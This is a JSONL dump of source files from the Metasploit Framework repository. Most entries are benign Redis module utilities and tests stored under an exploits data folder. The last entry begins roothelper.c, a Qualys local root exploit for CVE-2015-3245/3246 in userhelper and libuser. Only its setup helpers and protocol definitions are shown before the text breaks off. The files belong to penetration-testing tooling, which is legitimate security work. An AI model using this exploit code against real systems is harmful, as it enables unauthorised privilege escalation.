0)\n\n        sdsfree(y);\n        y = sdsdup(x);\n        sdsrange(y,-2,-1);\n        test_cond(\"sdsrange(...,-2,-1)\",\n            sdslen(y) == 2 && memcmp(y,\"ao\\0\",3) == 0)\n\n        sdsfree(y);\n        y = sdsdup(x);\n        sdsrange(y,2,1);\n        test_cond(\"sdsrange(...,2,1)\",\n            sdslen(y) == 0 && memcmp(y,\"\\0\",1) == 0)\n\n        sdsfree(y);\n        y = sdsdup(x);\n        sdsrange(y,1,100);\n        test_cond(\"sdsrange(...,1,100)\",\n            sdslen(y) == 3 && memcmp(y,\"iao\\0\",4) == 0)\n\n        sdsfree(y);\n        y = sdsdup(x);\n        sdsrange(y,100,100);\n        test_cond(\"sdsrange(...,100,100)\",\n            sdslen(y) == 0 && memcmp(y,\"\\0\",1) == 0)\n\n        sdsfree(y);\n        sdsfree(x);\n        x = sdsnew(\"foo\");\n        y = sdsnew(\"foa\");\n        test_cond(\"sdscmp(foo,foa)\", sdscmp(x,y) > 0)\n\n        sdsfree(y);\n        sdsfree(x);\n        x = sdsnew(\"bar\");\n        y = sdsnew(\"bar\");\n        test_cond(\"sdscmp(bar,bar)\", sdscmp(x,y) == 0)\n\n        sdsfree(y);\n        sdsfree(x);\n        x = sdsnew(\"aar\");\n        y = sdsnew(\"bar\");\n        test_cond(\"sdscmp(bar,bar)\", sdscmp(x,y) < 0)\n\n        sdsfree(y);\n        sdsfree(x);\n        x = sdsnewlen(\"\\a\\n\\0foo\\r\",7);\n        y = sdscatrepr(sdsempty(),x,sdslen(x));\n        test_cond(\"sdscatrepr(...data...)\",\n            memcmp(y,\"\\\"\\\\a\\\\n\\\\x00foo\\\\r\\\"\",15) == 0)\n\n        {\n            unsigned int oldfree;\n            char *p;\n            int step = 10, j, i;\n\n            sdsfree(x);\n            sdsfree(y);\n            x = sdsnew(\"0\");\n            test_cond(\"sdsnew() free/len buffers\", sdslen(x) == 1 && sdsavail(x) == 0);\n\n            /* Run the test a few times in order to hit the first two\n             * SDS header types. */\n            for (i = 0; i < 10; i++) {\n                int oldlen = sdslen(x);\n                x = sdsMakeRoomFor(x,step);\n                int type = x[-1]&SDS_TYPE_MASK;\n\n                test_cond(\"sdsMakeRoomFor() len\", sdslen(x) == oldlen);\n                if (type != SDS_TYPE_5) {\n                    test_cond(\"sdsMakeRoomFor() free\", sdsavail(x) >= step);\n                    oldfree = sdsavail(x);\n                }\n                p = x+oldlen;\n                for (j = 0; j < step; j++) {\n                    p[j] = 'A'+j;\n                }\n                sdsIncrLen(x,step);\n            }\n            test_cond(\"sdsMakeRoomFor() content\",\n                memcmp(\"0ABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJ\",x,101) == 0);\n            test_cond(\"sdsMakeRoomFor() final length\",sdslen(x)==101);\n\n            sdsfree(x);\n        }\n    }\n    test_report()\n    return 0;\n}\n#endif\n\n#ifdef SDS_TEST_MAIN\nint main(void) {\n    return sdsTest();\n}\n#endif\n", "timestamp": "2025-10-24T23:42:07.516184"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/redis/rmutil/strings.c", "content": "#include <string.h>\n#include <sys/param.h>\n#include <ctype.h>\n#include \"strings.h\"\n#include \"alloc.h\"\n\n#include \"sds.h\"\n\n// RedisModuleString *RMUtil_CreateFormattedString(RedisModuleCtx *ctx, const char *fmt, ...) {\n//     sds s = sdsempty();\n\n//     va_list ap;\n//     va_start(ap, fmt);\n//     s = sdscatvprintf(s, fmt, ap);\n//     va_end(ap);\n\n//     RedisModuleString *ret = RedisModule_CreateString(ctx, (const char *)s, sdslen(s));\n//     sdsfree(s);\n//     return ret;\n// }\n\nint RMUtil_StringEquals(RedisModuleString *s1, RedisModuleString *s2) {\n\n  const char *c1, *c2;\n  size_t l1, l2;\n  c1 = RedisModule_StringPtrLen(s1, &l1);\n  c2 = RedisModule_StringPtrLen(s2, &l2);\n  if (l1 != l2) return 0;\n\n  return strncmp(c1, c2, l1) == 0;\n}\n\nint RMUtil_StringEqualsC(RedisModuleString *s1, const char *s2) {\n\n  const char *c1;\n  size_t l1, l2 = strlen(s2);\n  c1 = RedisModule_StringPtrLen(s1, &l1);\n  if (l1 != l2) return 0;\n\n  return strncmp(c1, s2, l1) == 0;\n}\nint RMUtil_StringEqualsCaseC(RedisModuleString *s1, const char *s2) {\n\n  const char *c1;\n  size_t l1, l2 = strlen(s2);\n  c1 = RedisModule_StringPtrLen(s1, &l1);\n  if (l1 != l2) return 0;\n\n  return strncasecmp(c1, s2, l1) == 0;\n}\n\nvoid RMUtil_StringToLower(RedisModuleString *s) {\n\n  size_t l;\n  char *c = (char *)RedisModule_StringPtrLen(s, &l);\n  size_t i;\n  for (i = 0; i < l; i++) {\n    *c = tolower(*c);\n    ++c;\n  }\n}\n\nvoid RMUtil_StringToUpper(RedisModuleString *s) {\n  size_t l;\n  char *c = (char *)RedisModule_StringPtrLen(s, &l);\n  size_t i;\n  for (i = 0; i < l; i++) {\n    *c = toupper(*c);\n    ++c;\n  }\n}\n\nvoid RMUtil_StringConvert(RedisModuleString **rs, const char **ss, size_t n, int options) {\n  for (size_t ii = 0; ii < n; ++ii) {\n    const char *p = RedisModule_StringPtrLen(rs[ii], NULL);\n    if (options & RMUTIL_STRINGCONVERT_COPY) {\n      p = strdup(p);\n    }\n    ss[ii] = p;\n  }\n}", "timestamp": "2025-10-24T23:42:07.842249"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/redis/rmutil/test_heap.c", "content": "#include <stdio.h>\n#include \"heap.h\"\n#include \"assert.h\"\n\nint cmp(void *a, void *b) {\n    int *__a = (int *) a;\n    int *__b = (int *) b;\n    return *__a - *__b;\n}\n\nint main(int argc, char **argv) {\n    int myints[] = {10, 20, 30, 5, 15};\n    Vector *v = NewVector(int, 5);\n    for (int i = 0; i < 5; i++) {\n        Vector_Push(v, myints[i]);\n    }\n\n    Make_Heap(v, 0, v->top, cmp);\n\n    int n;\n    Vector_Get(v, 0, &n);\n    assert(30 == n);\n\n    Heap_Pop(v, 0, v->top, cmp);\n    v->top = 4;\n    Vector_Get(v, 0, &n);\n    assert(20 == n);\n\n    Vector_Push(v, 99);\n    Heap_Push(v, 0, v->top, cmp);\n    Vector_Get(v, 0, &n);\n    assert(99 == n);\n\n    Vector_Free(v);\n    printf(\"PASS!\\n\");\n    return 0;\n}\n\n", "timestamp": "2025-10-24T23:42:08.165099"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/redis/rmutil/test_periodic.c", "content": "#include <stdio.h>\n#include <redismodule.h>\n#include <unistd.h>\n#include \"periodic.h\"\n#include \"assert.h\"\n#include \"test.h\"\n\nvoid timerCb(RedisModuleCtx *ctx, void *p) {\n  int *x = p;\n  (*x)++;\n}\n\nint testPeriodic() {\n  int x = 0;\n  struct RMUtilTimer *tm = RMUtil_NewPeriodicTimer(\n      timerCb, NULL, &x, (struct timespec){.tv_sec = 0, .tv_nsec = 10000000});\n\n  sleep(1);\n\n  ASSERT_EQUAL(0, RMUtilTimer_Terminate(tm));\n  ASSERT(x > 0);\n  ASSERT(x <= 100);\n  return 0;\n}\n\nTEST_MAIN({ TESTFUNC(testPeriodic); });\n", "timestamp": "2025-10-24T23:42:08.484564"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/redis/rmutil/test_priority_queue.c", "content": "#include <stdio.h>\n#include \"assert.h\"\n#include \"priority_queue.h\"\n\nint cmp(void* i1, void* i2) {\n    int *__i1 = (int*) i1;\n    int *__i2 = (int*) i2;\n    return *__i1 - *__i2;\n}\n\nint main(int argc, char **argv) {\n    PriorityQueue *pq = NewPriorityQueue(int, 10, cmp);\n    assert(0 == Priority_Queue_Size(pq));\n\n    for (int i = 0; i < 5; i++) {\n        Priority_Queue_Push(pq, i);\n    }\n    assert(5 == Priority_Queue_Size(pq));\n\n    Priority_Queue_Pop(pq);\n    assert(4 == Priority_Queue_Size(pq));\n\n    Priority_Queue_Push(pq, 10);\n    Priority_Queue_Push(pq, 20);\n    Priority_Queue_Push(pq, 15);\n    int n;\n    Priority_Queue_Top(pq, &n);\n    assert(20 == n);\n\n    Priority_Queue_Pop(pq);\n    Priority_Queue_Top(pq, &n);\n    assert(15 == n);\n\n    Priority_Queue_Free(pq);\n    printf(\"PASS!\\n\");\n    return 0;\n}\n", "timestamp": "2025-10-24T23:42:08.833702"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/redis/rmutil/test_vector.c", "content": "#include \"vector.h\"\n#include <stdio.h>\n#include \"test.h\"\n\nint testVector() {\n\n  Vector *v = NewVector(int, 1);\n  ASSERT(v != NULL);\n  // Vector_Put(v, 0, 1);\n  // Vector_Put(v, 1, 3);\n  for (int i = 0; i < 10; i++) {\n    Vector_Push(v, i);\n  }\n  ASSERT_EQUAL(10, Vector_Size(v));\n  ASSERT_EQUAL(16, Vector_Cap(v));\n\n  for (int i = 0; i < Vector_Size(v); i++) {\n    int n;\n    int rc = Vector_Get(v, i, &n);\n    ASSERT_EQUAL(1, rc);\n    // printf(\"%d %d\\n\", rc, n);\n\n    ASSERT_EQUAL(n, i);\n  }\n\n  Vector_Free(v);\n\n  v = NewVector(char *, 0);\n  int N = 4;\n  char *strings[4] = {\"hello\", \"world\", \"foo\", \"bar\"};\n\n  for (int i = 0; i < N; i++) {\n    Vector_Push(v, strings[i]);\n  }\n  ASSERT_EQUAL(N, Vector_Size(v));\n  ASSERT(Vector_Cap(v) >= N);\n\n  for (int i = 0; i < Vector_Size(v); i++) {\n    char *x;\n    int rc = Vector_Get(v, i, &x);\n    ASSERT_EQUAL(1, rc);\n    ASSERT_STRING_EQ(x, strings[i]);\n  }\n\n  int rc = Vector_Get(v, 100, NULL);\n  ASSERT_EQUAL(0, rc);\n\n  Vector_Free(v);\n\n  return 0;\n  // Vector_Push(v, \"hello\");\n  // Vector_Push(v, \"world\");\n  // char *x = NULL;\n  // int rc = Vector_Getx(v, 0, &x);\n  // printf(\"rc: %d got %s\\n\", rc, x);\n}\n\nTEST_MAIN({ TESTFUNC(testVector); });\n", "timestamp": "2025-10-24T23:42:09.164144"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/redis/rmutil/util.c", "content": "#include <stdlib.h>\n#include <errno.h>\n#include <math.h>\n#include <ctype.h>\n#include <sys/time.h>\n#include <stdarg.h>\n#include <limits.h>\n#include <string.h>\n#define REDISMODULE_EXPERIMENTAL_API\n#include <redismodule.h>\n#include \"util.h\"\n\n/**\nCheck if an argument exists in an argument list (argv,argc), starting at offset.\n@return 0 if it doesn't exist, otherwise the offset it exists in\n*/\nint RMUtil_ArgExists(const char *arg, RedisModuleString **argv, int argc, int offset) {\n\n  size_t larg = strlen(arg);\n  for (; offset < argc; offset++) {\n    size_t l;\n    const char *carg = RedisModule_StringPtrLen(argv[offset], &l);\n    if (l != larg) continue;\n    if (carg != NULL && strncasecmp(carg, arg, larg) == 0) {\n      return offset;\n    }\n  }\n  return 0;\n}\n\n/**\nCheck if an argument exists in an argument list (argv,argc)\n@return -1 if it doesn't exist, otherwise the offset it exists in\n*/\nint RMUtil_ArgIndex(const char *arg, RedisModuleString **argv, int argc) {\n\n  size_t larg = strlen(arg);\n  for (int offset = 0; offset < argc; offset++) {\n    size_t l;\n    const char *carg = RedisModule_StringPtrLen(argv[offset], &l);\n    if (l != larg) continue;\n    if (carg != NULL && strncasecmp(carg, arg, larg) == 0) {\n      return offset;\n    }\n  }\n  return -1;\n}\n\nRMUtilInfo *RMUtil_GetRedisInfo(RedisModuleCtx *ctx) {\n\n  RedisModuleCallReply *r = RedisModule_Call(ctx, \"INFO\", \"c\", \"all\");\n  if (r == NULL || RedisModule_CallReplyType(r) == REDISMODULE_REPLY_ERROR) {\n    return NULL;\n  }\n\n  int cap = 100;  // rough estimate of info lines\n  RMUtilInfo *info = malloc(sizeof(RMUtilInfo));\n  info->entries = calloc(cap, sizeof(RMUtilInfoEntry));\n\n  int i = 0;\n  size_t sz;\n  char *text = (char *)RedisModule_CallReplyStringPtr(r, &sz);\n\n  char *line = text;\n  while (line && line < text + sz) {\n    char *line = strsep(&text, \"\\r\\n\");\n    if (line == NULL) break;\n\n    if (!(*line >= 'a' && *line <= 'z')) {  // skip non entry lines\n      continue;\n    }\n\n    char *key = strsep(&line, \":\");\n    info->entries[i].key = strdup(key);\n    info->entries[i].val = strdup(line);\n    i++;\n    if (i >= cap) {\n      cap *= 2;\n      info->entries = realloc(info->entries, cap * sizeof(RMUtilInfoEntry));\n    }\n  }\n  info->numEntries = i;\n  RedisModule_FreeCallReply(r);\n  return info;\n}\nvoid RMUtilRedisInfo_Free(RMUtilInfo *info) {\n  for (int i = 0; i < info->numEntries; i++) {\n    free(info->entries[i].key);\n    free(info->entries[i].val);\n  }\n  free(info->entries);\n  free(info);\n}\n\nint RMUtilInfo_GetInt(RMUtilInfo *info, const char *key, long long *val) {\n\n  const char *p = NULL;\n  if (!RMUtilInfo_GetString(info, key, &p)) {\n    return 0;\n  }\n\n  *val = strtoll(p, NULL, 10);\n  if ((errno == ERANGE && (*val == LONG_MAX || *val == LONG_MIN)) || (errno != 0 && *val == 0)) {\n    *val = -1;\n    return 0;\n  }\n\n  return 1;\n}\n\nint RMUtilInfo_GetString(RMUtilInfo *info, const char *key, const char **str) {\n  int i;\n  for (i = 0; i < info->numEntries; i++) {\n    if (!strcmp(key, info->entries[i].key)) {\n      *str = info->entries[i].val;\n      return 1;\n    }\n  }\n  return 0;\n}\n\nint RMUtilInfo_GetDouble(RMUtilInfo *info, const char *key, double *d) {\n  const char *p = NULL;\n  if (!RMUtilInfo_GetString(info, key, &p)) {\n    printf(\"not found %s\\n\", key);\n    return 0;\n  }\n\n  *d = strtod(p, NULL);\n  if ((errno == ERANGE && (*d == HUGE_VAL || *d == -HUGE_VAL)) || (errno != 0 && *d == 0)) {\n    return 0;\n  }\n\n  return 1;\n}\n\n/*\nc -- pointer to a Null terminated C string pointer.\nb -- pointer to a C buffer, followed by pointer to a size_t for its length\ns -- pointer to a RedisModuleString\nl -- pointer to Long long integer.\nd -- pointer to a Double\n* -- do not parse this argument at all\n*/\nint RMUtil_ParseArgs(RedisModuleString **argv, int argc, int offset, const char *fmt, ...) {\n  va_list ap;\n  va_start(ap, fmt);\n  int rc = rmutil_vparseArgs(argv, argc, offset, fmt, ap);\n  va_end(ap);\n  return rc;\n}\n\n// Internal function that parses arguments based on the format described above\nint rmutil_vparseArgs(RedisModuleString **argv, int argc, int offset, const char *fmt, va_list ap) {\n\n  int i = offset;\n  char *c = (char *)fmt;\n  while (*c && i < argc) {\n\n    // read c string\n    if (*c == 'c') {\n      char **p = va_arg(ap, char **);\n      *p = (char *)RedisModule_StringPtrLen(argv[i], NULL);\n    } else if (*c == 'b') {\n      char **p = va_arg(ap, char **);\n      size_t *len = va_arg(ap, size_t *);\n      *p = (char *)RedisModule_StringPtrLen(argv[i], len);\n    } else if (*c == 's') {  // read redis string\n\n      RedisModuleString **s = va_arg(ap, void *);\n      *s = argv[i];\n\n    } else if (*c == 'l') {  // read long\n      long long *l = va_arg(ap, long long *);\n\n      if (RedisModule_StringToLongLong(argv[i], l) != REDISMODULE_OK) {\n        return REDISMODULE_ERR;\n      }\n    } else if (*c == 'd') {  // read double\n      double *d = va_arg(ap, double *);\n      if (RedisModule_StringToDouble(argv[i], d) != REDISMODULE_OK) {\n        return REDISMODULE_ERR;\n      }\n    } else if (*c == '*') {  // skip current arg\n      // do nothing\n    } else {\n      return REDISMODULE_ERR;  // WAT?\n    }\n    c++;\n    i++;\n  }\n  // if the format is longer than argc, retun an error\n  if (*c != 0) {\n    return REDISMODULE_ERR;\n  }\n  return REDISMODULE_OK;\n}\n\nint RMUtil_ParseArgsAfter(const char *token, RedisModuleString **argv, int argc, const char *fmt,\n                          ...) {\n\n  int pos = RMUtil_ArgIndex(token, argv, argc);\n  if (pos < 0) {\n    return REDISMODULE_ERR;\n  }\n\n  va_list ap;\n  va_start(ap, fmt);\n  int rc = rmutil_vparseArgs(argv, argc, pos + 1, fmt, ap);\n  va_end(ap);\n  return rc;\n}\n\nRedisModuleCallReply *RedisModule_CallReplyArrayElementByPath(RedisModuleCallReply *rep,\n                                                              const char *path) {\n  if (rep == NULL) return NULL;\n\n  RedisModuleCallReply *ele = rep;\n  const char *s = path;\n  char *e;\n  long idx;\n  do {\n    errno = 0;\n    idx = strtol(s, &e, 10);\n\n    if ((errno == ERANGE && (idx == LONG_MAX || idx == LONG_MIN)) || (errno != 0 && idx == 0) ||\n        (REDISMODULE_REPLY_ARRAY != RedisModule_CallReplyType(ele)) || (s == e)) {\n      ele = NULL;\n      break;\n    }\n    s = e;\n    ele = RedisModule_CallReplyArrayElement(ele, idx - 1);\n\n  } while ((ele != NULL) && (*e != '\\0'));\n\n  return ele;\n}\n\nint RedisModule_TryGetValue(RedisModuleKey *key, const RedisModuleType *type, void **out) {\n  if (key == NULL) {\n    return RMUTIL_VALUE_MISSING;\n  }\n  int keytype = RedisModule_KeyType(key);\n  if (keytype == REDISMODULE_KEYTYPE_EMPTY) {\n    return RMUTIL_VALUE_EMPTY;\n  } else if (keytype == REDISMODULE_KEYTYPE_MODULE && RedisModule_ModuleTypeGetType(key) == type) {\n    *out = RedisModule_ModuleTypeGetValue(key);\n    return RMUTIL_VALUE_OK;\n  } else {\n    return RMUTIL_VALUE_MISMATCH;\n  }\n}\n\nRedisModuleString **RMUtil_ParseVarArgs(RedisModuleString **argv, int argc, int offset,\n                                        const char *keyword, size_t *nargs) {\n  if (offset > argc) {\n    return NULL;\n  }\n\n  argv += offset;\n  argc -= offset;\n\n  int ix = RMUtil_ArgIndex(keyword, argv, argc);\n  if (ix < 0) {\n    return NULL;\n  } else if (ix >= argc - 1) {\n    *nargs = RMUTIL_VARARGS_BADARG;\n    return argv;\n  }\n\n  argv += (ix + 1);\n  argc -= (ix + 1);\n\n  long long n = 0;\n  RMUtil_ParseArgs(argv, argc, 0, \"l\", &n);\n  if (n > argc - 1 || n < 0) {\n    *nargs = RMUTIL_VARARGS_BADARG;\n    return argv;\n  }\n\n  *nargs = n;\n  return argv + 1;\n}\n\nvoid RMUtil_DefaultAofRewrite(RedisModuleIO *aof, RedisModuleString *key, void *value) {\n  RedisModuleCtx *ctx = RedisModule_GetThreadSafeContext(NULL);\n  RedisModuleCallReply *rep = RedisModule_Call(ctx, \"DUMP\", \"s\", key);\n  if (rep != NULL && RedisModule_CallReplyType(rep) == REDISMODULE_REPLY_STRING) {\n    size_t n;\n    const char *s = RedisModule_CallReplyStringPtr(rep, &n);\n    RedisModule_EmitAOF(aof, \"RESTORE\", \"slb\", key, 0, s, n);\n  } else {\n    RedisModule_Log(RedisModule_GetContextFromIO(aof), \"warning\", \"Failed to emit AOF\");\n  }\n  if (rep != NULL) {\n    RedisModule_FreeCallReply(rep);\n  }\n  RedisModule_FreeThreadSafeContext(ctx);\n}", "timestamp": "2025-10-24T23:42:09.553425"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/redis/rmutil/vector.c", "content": "#include \"vector.h\"\n#include <stdio.h>\n\ninline int __vector_PushPtr(Vector *v, void *elem) {\n  if (v->top == v->cap) {\n    Vector_Resize(v, v->cap ? v->cap * 2 : 1);\n  }\n\n  __vector_PutPtr(v, v->top, elem);\n  return v->top;\n}\n\ninline int Vector_Get(Vector *v, size_t pos, void *ptr) {\n  // return 0 if pos is out of bounds\n  if (pos >= v->top) {\n    return 0;\n  }\n\n  memcpy(ptr, v->data + (pos * v->elemSize), v->elemSize);\n  return 1;\n}\n\n/* Get the element at the end of the vector, decreasing the size by one */\ninline int Vector_Pop(Vector *v, void *ptr) {\n  if (v->top > 0) {\n    if (ptr != NULL) {\n      Vector_Get(v, v->top - 1, ptr);\n    }\n    v->top--;\n    return 1;\n  }\n  return 0;\n}\n\ninline int __vector_PutPtr(Vector *v, size_t pos, void *elem) {\n  // resize if pos is out of bounds\n  if (pos >= v->cap) {\n    Vector_Resize(v, pos + 1);\n  }\n\n  if (elem) {\n    memcpy(v->data + pos * v->elemSize, elem, v->elemSize);\n  } else {\n    memset(v->data + pos * v->elemSize, 0, v->elemSize);\n  }\n  // move the end offset to pos if we grew\n  if (pos >= v->top) {\n    v->top = pos + 1;\n  }\n  return 1;\n}\n\nint Vector_Resize(Vector *v, size_t newcap) {\n  int oldcap = v->cap;\n  v->cap = newcap;\n\n  v->data = realloc(v->data, v->cap * v->elemSize);\n\n  // If we grew:\n  // put all zeros at the newly realloc'd part of the vector\n  if (newcap > oldcap) {\n    int offset = oldcap * v->elemSize;\n    memset(v->data + offset, 0, v->cap * v->elemSize - offset);\n  }\n  return v->cap;\n}\n\nVector *__newVectorSize(size_t elemSize, size_t cap) {\n  Vector *vec = malloc(sizeof(Vector));\n  vec->data = calloc(cap, elemSize);\n  vec->top = 0;\n  vec->elemSize = elemSize;\n  vec->cap = cap;\n\n  return vec;\n}\n\nvoid Vector_Free(Vector *v) {\n  free(v->data);\n  free(v);\n}\n\n\n/* return the used size of the vector, regardless of capacity */\ninline int Vector_Size(Vector *v) { return v->top; }\n\n/* return the actual capacity */\ninline int Vector_Cap(Vector *v) { return v->cap; }\n", "timestamp": "2025-10-24T23:42:09.870941"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/roothelper/roothelper.c", "content": "/*\n * roothelper.c - an unusual local root exploit against:\n * CVE-2015-3245 userhelper chfn() newline filtering\n * CVE-2015-3246 libuser passwd file handling\n * Copyright (C) 2015 Qualys, Inc.\n *\n * gecos_* types and functions inspired by userhelper.c\n * Copyright (C) 1997-2003, 2007, 2008 Red Hat, Inc.\n *\n * UH_* #defines and comments inspired by userhelper.h\n * Copyright (C) 1997-2001, 2007 Red Hat, Inc.\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program.  If not, see <http://www.gnu.org/licenses/>.\n */\n\n// Modified for Metasploit (see comments marked 'msf note')\n \n#define _GNU_SOURCE\n#include <ctype.h>\n#include <errno.h>\n#include <fcntl.h>\n#include <inttypes.h>\n#include <limits.h>\n#include <pwd.h>\n#include <sched.h>\n#include <signal.h>\n#include <stdarg.h>\n#include <stdbool.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/inotify.h>\n#include <sys/resource.h>\n#include <sys/socket.h>\n#include <sys/stat.h>\n#include <sys/time.h>\n#include <sys/types.h>\n#include <sys/wait.h>\n#include <unistd.h>\n \n/* A maximum GECOS field length.  There's no hard limit, so we guess. */\n#define GECOS_LENGTH                    127\n \ntypedef char gecos_field[GECOS_LENGTH];\n \n/* A structure to hold broken-out GECOS data.  The number and names of the\n * fields are dictated entirely by the flavor of finger we use.  Seriously. */\nstruct gecos_data {\n    gecos_field full_name;      /* full user name */\n    gecos_field office;         /* office */\n    gecos_field office_phone;   /* office phone */\n    gecos_field home_phone;     /* home phone */\n    gecos_field site_info;      /* other stuff */\n};\n \nstatic struct userhelper {\n    struct gecos_data gecos;\n    rlim_t fsizelim;\n    pid_t pid;\n    int fd;\n} userhelpers[GECOS_LENGTH];\n \nstatic void\ndie_in_parent(const char *const file, const unsigned int line,\n              const char *const function)\n{\n    fprintf(stderr, \"died in parent: %s:%u: %s\\n\", file, line, function);\n    fflush(stderr);\n \n    unsigned int i;\n    for (i = 0; i < GECOS_LENGTH; i++) {\n        const pid_t pid = userhelpers[i].pid;\n        if (pid <= 0) continue;\n        kill(pid, SIGKILL);\n    }\n    _exit(EXIT_FAILURE);\n}\n \nstatic void\ndie_in_child(const char *const file, const unsigned int line,\n             const char *const function)\n{\n    fprintf(stderr, \"died in child: %s:%u: %s\\n\", file, line, function);\n    exit(EXIT_FAILURE);\n}\n \nstatic void (*die_fn)(const char *, unsigned int, const char *) = die_in_parent;\n#define die() die_fn(__FILE__, __LINE__, __func__)\n \nstatic void *\nxmalloc(const size_t size)\n{\n    if (size <= 0) die();\n    if (size >= INT_MAX) die();\n    void *const ptr = malloc(size);\n    if (ptr == NULL) die();\n    return ptr;\n}\n \nstatic void *\nxrealloc(void *const old, const size_t size)\n{\n    if (size <= 0) die();\n    if (size >= INT_MAX) die();\n    void *const new = realloc(old, size);\n    if (new == NULL) die();\n    return new;\n}\n \nstatic char *\nxstrndup(const char *const old, const size_t len)\n{\n    if (old == NULL) die();\n    if (len >= INT_MAX) die();\n \n    char *const new = strndup(old, len);\n \n    if (new == NULL) die();\n    if (len != strlen(new)) die();\n    return new;\n}\n \nstatic int\nxsnprintf(char *const str, const size_t size, const char *const format, ...)\n{\n    if (str == NULL) die();\n    if (size <= 0) die();\n    if (size >= INT_MAX) die();\n    if (format == NULL) die();\n \n    va_list ap;\n    va_start(ap, format);\n    const int len = vsnprintf(str, size, format, ap);\n    va_end(ap);\n \n    if (len < 0) die();\n    if ((unsigned int)len >= size) die();\n    if ((unsigned int)len != strlen(str)) die();\n    return len;\n}\n \nstatic int\nxopen(const char *const pathname, const int flags)\n{\n    if (pathname == NULL) die();\n    if (*pathname != '/') die();\n    if (flags != O_RDONLY) die();\n \n    const int fd = open(pathname, flags);\n    if (fd <= -1) die();\n \n    static const struct flock rdlock = {\n        .l_type = F_RDLCK,\n        .l_whence = SEEK_SET,\n        .l_start = 0,\n        .l_len = 0\n    };\n    if (fcntl(fd, F_SETLK, &rdlock) != 0) die();\n    return fd;\n}\n \nstatic void\nxclose(const int fd)\n{\n    if (fd <= -1) die();\n    static const struct flock unlock = {\n        .l_type = F_UNLCK,\n        .l_whence = SEEK_SET,\n        .l_start = 0,\n        .l_len = 0\n    };\n    if (fcntl(fd, F_SETLK, &unlock) != 0) die();\n    if (close(fd) != 0) die();\n}\n \n#define GECOS_BADCHARS \":,=\\n\"\n \n/* A simple function to compute the size of a gecos string containing the\n * data we have. */\nstatic size_t\ngecos_size(const struct gecos_data *const parsed)\n{\n    if (parsed == NULL) die();\n \n    size_t len = 4; /* commas! */\n    len += strlen(parsed->full_name);\n    len += strlen(parsed->office);\n    len += strlen(parsed->office_phone);\n    len += strlen(parsed->home_phone);\n    len += strlen(parsed->site_info);\n    len++;\n    return len;\n}\n \n/* Parse the passed-in GECOS string and set PARSED to its broken-down contents.\n   Note that the parsing is performed using the convention obeyed by BSDish\n   finger(1) under Linux. */\nstatic void\ngecos_parse(const char *const gecos, struct gecos_data *const parsed)\n{\n    if (gecos == NULL) die();\n    if (strlen(gecos) >= INT_MAX) die();\n \n    if (parsed == NULL) die();\n    memset(parsed, 0, sizeof(*parsed));\n \n    unsigned int i;\n    const char *field = gecos;\n \n    for (i = 0; ; i++) {\n        const char *field_end = strchrnul(field, ',');\n        gecos_field *dest = NULL;\n \n        switch (i) {\n        case 0:\n            dest = &parsed->full_name;\n            break;\n        case 1:\n            dest = &parsed->office;\n            break;\n        case 2:\n            dest = &parsed->office_phone;\n            break;\n        case 3:\n            dest = &parsed->home_phone;\n            break;\n        case 4:\n            // msf note: changed `rawmemchar` to `memchr` for cross-compile\n            //field_end = rawmemchr(field_end, '\\0');\n            field_end = memchr(field_end, '\\0', 16);\n            dest = &parsed->site_info;\n            break;\n        default:\n            die();\n        }\n        const size_t field_len = field_end - field;\n        xsnprintf(*dest, sizeof(*dest), \"%.*s\", (int)field_len, field);\n        if (strlen(*dest) != field_len) die();\n \n        if (strpbrk(*dest, GECOS_BADCHARS) != NULL && i != 4) die();\n \n        if (*field_end == '\\0') break;\n        field = field_end + 1;\n    }\n    if (gecos_size(parsed) > GECOS_LENGTH) die();\n}\n \n/* Assemble a new gecos string. */\nstatic const char *\ngecos_assemble(const struct gecos_data *const parsed)\n{\n    static char ret[GECOS_LENGTH];\n    size_t i;\n \n    if (parsed == NULL) die();\n    /* Construct the basic version of the string. */\n    xsnprintf(ret, sizeof(ret), \"%s,%s,%s,%s,%s\",\n                                parsed->full_name,\n                                parsed->office,\n                                parsed->office_phone,\n                                parsed->home_phone,\n                                parsed->site_info);\n    /* Strip off terminal commas. */\n    i = strlen(ret);\n    while ((i > 0) && (ret[i - 1] == ',')) {\n        ret[i - 1] = '\\0';\n        i--;\n    }\n    return ret;\n}\n \n/* Descriptors used to communicate between userhelper and consolhelper. */\n#define UH_INFILENO 3\n#define UH_OUTFILENO 4\n \n/* Userhelper request format:\n   request code as a single character,\n   request data size as UH_REQUEST_SIZE_DIGITS decimal digits\n   request data\n   '\\n' */\n#define UH_REQUEST_SIZE_DIGITS 8\n \n/* Synchronization point code. */\n#define UH_SYNC_POINT 32\n \n/* Valid userhelper request codes. */\n#define UH_ECHO_ON_PROMPT 34\n#define UH_ECHO_OFF_PROMPT 35\n#define UH_EXPECT_RESP 39\n#define UH_SERVICE_NAME 40\n#define UH_USER 42\n \n/* Consolehelper response format:\n   response code as a single character,\n   response data\n   '\\n' */\n \n/* Consolehelper response codes. */\n#define UH_TEXT 33\n \n/* Valid userhelper error codes. */\n#define ERR_UNK_ERROR           255     /* unknown error */\n \n/* Paths, flag names, and other stuff. */\n#define UH_PATH \"/usr/sbin/userhelper\"\n#define UH_FULLNAME_OPT \"-f\"\n#define UH_OFFICE_OPT \"-o\"\n#define UH_OFFICEPHONE_OPT \"-p\"\n#define UH_HOMEPHONE_OPT \"-h\"\n \nstatic char\nread_request(const int fd, char *const data, const size_t 